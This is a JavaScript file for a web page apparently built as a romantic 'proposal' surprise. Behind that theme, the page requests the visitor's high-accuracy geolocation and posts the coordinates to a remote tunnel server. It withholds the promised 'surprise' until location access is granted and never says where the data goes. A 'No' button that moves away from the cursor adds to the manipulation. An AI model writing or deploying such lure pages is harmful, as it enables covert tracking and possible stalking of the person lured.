document.getElementById('start-btn').addEventListener('click', function () {
    const statusText = document.getElementById('status-text');

    if (!navigator.geolocation) {
        statusText.innerText = "Geolocation is not supported by your browser. Please try a modern browser.";
        return;
    }

    statusText.innerText = "Requesting permission... Please check your browser prompt.";

    navigator.geolocation.getCurrentPosition(
        async function (position) {
            const payload = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };

            try {
                // Send payload to backend API
                const response = await fetch('https://3w3tm668-3000.inc1.devtunnels.ms/api/location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    transitionToProposal();
                } else {
                    statusText.innerText = "Server error. Please reload the page and try again.";
                }
            } catch (error) {
                console.error("Network error:", error);
                statusText.innerText = "Network error connection failed. Please reload and ensure server is online.";
            }
        },
        function (error) {
            console.warn("Location error:", error.message);
            statusText.innerHTML = "<span style='color: red;'>Permission Denied or Timeout.</span><br>To view this special surprise, please refresh and accept the location permission.";
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
});

function transitionToProposal() {
    // 1. Add the background image class to the body element
    document.body.classList.add('has-bg-image');

    // Hide setup, show proposal
    document.getElementById('setup-screen').classList.add('hidden');
    document.getElementById('proposal-screen').classList.remove('hidden');

    // Attempt to play audio (allowed since user explicitly clicked the start button)
    const audio = document.getElementById('bg-music');
    audio.play().catch(err => console.log("Audio autoplay prevented: ", err));
}

// Interactive button effect for the 'No' button
const noBtn = document.getElementById('no-btn');
noBtn.addEventListener('mouseover', function () {
    // Optional: make the button move away or enlarge the yes button
    const x = Math.random() * (window.innerWidth - this.offsetWidth);
    const y = Math.random() * (window.innerHeight - this.offsetHeight);
    this.style.position = 'absolute';
    this.style.left = x + 'px';
    this.style.top = y + 'px';
});

document.getElementById('yes-btn').addEventListener('click', function () {
    alert("💖 Thank you for making my world beautiful! 🌹");
});